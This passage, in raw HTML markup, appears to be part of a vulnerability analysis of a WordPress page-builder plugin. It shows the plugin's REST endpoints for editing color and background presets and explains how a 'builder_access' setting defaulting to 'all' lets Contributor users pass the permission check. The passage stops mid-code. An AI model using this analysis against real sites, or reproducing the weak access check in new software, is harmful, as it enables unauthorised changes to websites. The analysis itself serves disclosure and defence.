class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/color_presets/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;CREATABLE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__CLASS__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;::set_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__CLASS__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;::check_permission&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-controls/v1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/color_presets/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;DELETABLE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__CLASS__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;::delete_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__CLASS__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;::check_permission&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-controls/v1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/background_presets/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;CREATABLE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__CLASS__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;::set_background_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__CLASS__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;::check_permission&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin registers &lt;strong&gt;REST API endpoints&lt;/strong&gt; under the namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, which can &lt;strong&gt;add, modify, or delete&lt;/strong&gt; &lt;strong&gt;global color presets&lt;/strong&gt; and &lt;strong&gt;background presets&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;These APIs control access via the callback &lt;code&gt;check_permission&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;check_permission&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;FLBuilderUserAccess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;builder_access&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin customizes a &lt;code&gt;current_user_can&lt;/code&gt; function and checks the &lt;code&gt;builder_access&lt;/code&gt; permission:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;register_default_settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;register_setting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;builder_access&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;all&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;group&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Frontend&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-builder&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;label&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Builder&amp;ensp;Access&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-builder&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;The&amp;ensp;selected&amp;ensp;roles&amp;ensp;will&amp;ensp;have&amp;ensp;access&amp;ensp;to&amp;ensp;the&amp;ensp;builder&amp;ensp;for&amp;ensp;editing&amp;ensp;posts,&amp;ensp;pages,&amp;ensp;and&amp;ensp;CPTs.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-builder&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;order&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;register_setting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unrestricted_editing&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;all&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;group&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Frontend&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-builder&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;label&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Unrestricted&amp;ensp;Editing&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-builder&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;The&amp;ensp;selected&amp;ensp;roles&amp;ensp;will&amp;ensp;have&amp;ensp;unrestricted&amp;ensp;access&amp;ensp;to&amp;ensp;all&amp;ensp;editing&amp;ensp;features&amp;ensp;within&amp;ensp;the&amp;ensp;builder.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fl-builder&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;order&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;builder_access&lt;/code&gt; is registered with &lt;code&gt;&#39;default&#39;&amp;ensp;=&amp;gt;&amp;ensp;&#39;all&#39;&lt;/code&gt;, meaning it applies to all users.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Question&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;If &lt;code&gt;builder_access&lt;/code&gt; applies to all users, why is the vulnerability reported for Contributor privileges?&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;p&gt;The answer lies in the logic of the plugin&amp;rsquo;s &lt;code&gt;current_user_can&lt;/code&gt; function:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_get_current_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span 